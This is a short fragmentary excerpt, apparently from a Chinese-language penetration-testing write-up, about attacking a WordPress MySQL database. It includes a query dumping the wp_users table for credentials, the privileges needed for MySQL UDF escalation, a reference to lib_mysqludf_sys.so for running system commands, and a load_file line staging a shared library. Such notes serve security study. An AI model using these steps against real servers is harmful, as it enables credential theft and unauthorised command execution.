...
export https\_proxy="http://192.168.99.74:50302"
...
# 在虚拟环境中安装requests\_toolbelt
  
pip3 install requests\_toolbelt
...
从数据表从查询用户名密码  select \* from wp\_users;
...
* **FILE权限**
  ：允许读写服务器文件（通过SELECT ... INTO OUTFILE或LOAD\_FILE）。
* **CREATE FUNCTION权限**
  ：允许创建自定义函数。
* **INSERT/UPDATE权限**
...
* **UDF动态库兼容性**
  ...
  + 示例库：lib\_mysqludf\_sys.so（用于执行系统命令）。
...
insert into foo values(load\_file('/tmp/1518.so'));
